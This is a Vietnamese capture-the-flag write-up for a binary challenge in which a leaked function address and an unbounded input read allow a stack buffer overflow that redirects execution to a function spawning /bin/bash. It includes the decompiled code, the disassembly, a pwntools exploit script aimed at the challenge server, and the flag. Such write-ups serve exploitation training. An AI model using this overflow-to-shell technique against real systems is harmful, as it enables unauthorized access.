# scret-weapon
## Đề bài
```c
int __usercall townsquare@<eax>(int a1@<ebp>)
{
  int v2; // [esp-1Ch] [ebp-1Ch]
  int v3; // [esp-4h] [ebp-4h]

  __asm { endbr32 }
  v3 = a1;
  sub_10D0("You wanna open the arsenal. Tell me the passphrase!");
  sub_10C0("Your current location is townsquare with the address %p \n", townsquare);
  return sub_1100("%s", &v2);
}
```

```asm
.text:000012D6                 public arsenal
.text:000012D6 arsenal         proc near
.text:000012D6 ; __unwind {
.text:000012D6                 endbr32
.text:000012DA                 push    ebp
.text:000012DB                 mov     ebp, esp
.text:000012DD                 sub     esp, 8
.text:000012E0                 call    __x86_get_pc_thunk_ax
.text:000012E5                 add     eax, 2CD7h
.text:000012EA                 sub     esp, 0Ch
.text:000012ED                 lea     eax, (aBinBash - 3FBCh)[eax] ; "/bin/bash"
.text:000012F3                 push    eax
.text:000012F4                 call    run_cmd
.text:000012F9                 add     esp, 10h
.text:000012FC                 nop
.text:000012FD                 leave
.text:000012FE                 retn
.text:000012FE ; } // starts at 12D6
.text:000012FE arsenal         endp
```
- Dễ thấy, khi thực thi hàm `townsquare` thì chương trình in ra địa chỉ của hàm `townsquare`, dựa vào đó ta có thể tính ra được địa chỉ của hàm `arsenal` để lấy flag

## script
```python3
from pwn import *
import struct

r = remote('61.28.237.24', 30201)

print(r.recvuntil('townsquare with the address '))
address = r.recvline()
address = int(address.rstrip(b' \n').lstrip(b'0x'), 16)
address -= 41
address = struct.pack("<I", address)
r.sendline(b'a' * 28 + address)
r.interactive()
```

Flag: HCMUS-CTF{you_know_how_to_compute_location}